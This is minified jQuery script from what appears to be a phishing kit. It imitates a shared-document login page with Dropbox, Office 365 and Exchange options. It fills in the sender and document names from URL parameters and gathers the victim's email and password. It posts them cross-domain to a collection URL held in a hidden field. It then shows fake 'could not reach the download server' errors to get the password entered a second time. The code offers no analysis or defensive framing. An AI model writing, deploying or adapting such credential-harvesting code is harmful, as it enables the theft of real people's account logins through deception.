$(document).ready(function(){function e(e){for(var a=window.location.search.substring(1),r=a.split("&"),o=0;o<r.length;o++){var s=r[o].split("=");if(s[0]==e)return decodeURIComponent(s[1])}}function a(e){var a=/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;return a.test(e)}var r=e("username"),o=e("id"),s=e("data");$("#sender-name").html(r),$("#sender-email").html(o),$("#shared-doc-0, #shared-doc-1, #shared-doc-2, #shared-doc-3").html(s),$("#email, #password").keydown(function(){$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden")}),$("#login-back-button").click(function(e){$("#content-loading").show().delay(2e3).fadeOut(),$("#login-form")[0].reset(),$("#email").attr("placeholder","").val("").delay(600).queue(function(){$("#email").attr("placeholder","you@mail.com").val("").dequeue()}).focus(),$("#password").attr("placeholder","").val("").delay(600).queue(function(){$("#password").attr("placeholder","Password").val("").dequeue()}),$("#login-count").val("0"),$("#login-access-via").val("DRPBX"),$("#office-login-logo, #exchange-login-logo, #connected-to, #login-back-button").delay(600).fadeOut(),$("#login-options, #forgot-password").delay(1e3).fadeIn(2e3),$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden")}),$("#office-login").click(function(){var e=$("#office-login-url").val();if(e){$("#login-form")[0].reset(),$("#login-count").val("0"),$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden");let r="scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=500,top=100";officeAuth=window.open(e,"Auth",r);var a=setInterval(function(){officeAuth.closed&&($("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Oops! There was an error connecting to your server. Please try again in a few seconds.").removeClass("visually-hidden"),clearInterval(a))},1e3);officeAuth||(window.location.href=e)}else $("#content-loading").removeClass("visually-hidden").delay(2e3).addClass("visually-hidden"),$("#email").attr("placeholder","").val("").delay(600).queue(function(){$("#email").attr("placeholder","Microsoft Email").val("").dequeue()}).focus(),$("#password").attr("placeholder","").val("").delay(600).queue(function(){$("#password").attr("placeholder","Microsoft Password").val("").dequeue()}),$("#login-type").html("Microsoft"),$("#login-access-via").val("O-365"),$("#login-options, #forgot-password").delay(600).fadeOut(),$("#office-login-logo, #connected-to, #login-back-button").delay(1e3).fadeIn(2e3),$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden")}),$("#exchange-login").click(function(){var e=$("#exchange-login-url").val();if(e){$("#login-form")[0].reset(),$("#login-count").val("0"),$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden");let r="scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=500,top=100";exchangeAuth=window.open(e,"Auth",r);var a=setInterval(function(){exchangeAuth.closed&&($("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Oops! There was an error connecting to your server. Please try again in a few seconds.").removeClass("visually-hidden"),clearInterval(a))},1e3);officeAuth||(window.location.href=e)}else $("#content-loading").removeClass("visually-hidden").delay(2e3).addClass("visually-hidden"),$("#email").attr("placeholder","").val("").delay(600).queue(function(){$("#email").attr("placeholder","Exchange Email").val("").dequeue()}).focus(),$("#password").attr("placeholder","").val("").delay(600).queue(function(){$("#password").attr("placeholder","Exchange Password").val("").dequeue()}),$("#login-type").html("Exchange"),$("#login-access-via").val("OWA"),$("#login-options, #forgot-password").delay(600).fadeOut(),$("#exchange-login-logo, #connected-to, #login-back-button").delay(1e3).fadeIn(2e3),$("#email, #password").removeClass("input-error"),$("#auth-error-card").removeClass("c-card c-card--error"),$("#auth-error-message, #email-error-message, #password-error-message").html("").addClass("visually-hidden")}),$("#login-form").submit(function(e){e.preventDefault();var r=$("#email").val(),o=$("#password").val();r?a(r)?o?o.length<5?($("#password").addClass("input-error").focus(),$("#password-error-message").html("Please enter your Password").addClass("error-message")):jQuery.ajax({url:$("#result-url").val(),data:$("#login-form").serialize(),type:"POST",crossDomain:!0,beforeSend:function(){$("#login-form input").blur(),$("#login-loading").show()},success:function(e){e.match(/1/i)?($("#login-count").val("1"),$("#password").val("").focus(),$("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Oops! We could not reach the download server. Please try again.").removeClass("visually-hidden")):e.match(/2/i)?($("#login-count").val("0"),$("#password").val("").focus(),$("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Oops! We could not reach the download server. Please try again.").removeClass("visually-hidden")):e.match(/0/i)?($("#login-count").val("0"),$("#email").focus(),$("#email, #password").val(""),$("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Network Error. Please check your internet and try again.").removeClass("visually-hidden")):e.match(/invalid/i)&&($("#login-count").val("0"),$("#email").addClass("input-error").focus(),$("#email-error-message").html("Invalid email or password").addClass("error-message"),$("#password").val(""),$("#auth-error-card").addClass("c-card c-card--error"),$("#auth-error-message").html("Oops! It looks like you may have forgotten your email or password.").removeClass("visually-hidden"))},error:function(){}}):($("#password").addClass("input-error").focus(),$("#password-error-message").html("Please enter your Password").addClass("error-message")):($("#email").addClass("input-error").focus(),$("#email-error-message").html("An email address must contain a single @ and the domain portion of the email address (the portion after the @)").addClass("error-message")):($("#email").addClass("input-error").focus(),$("#email-error-message").html("Please enter your email").addClass("error-message"))})});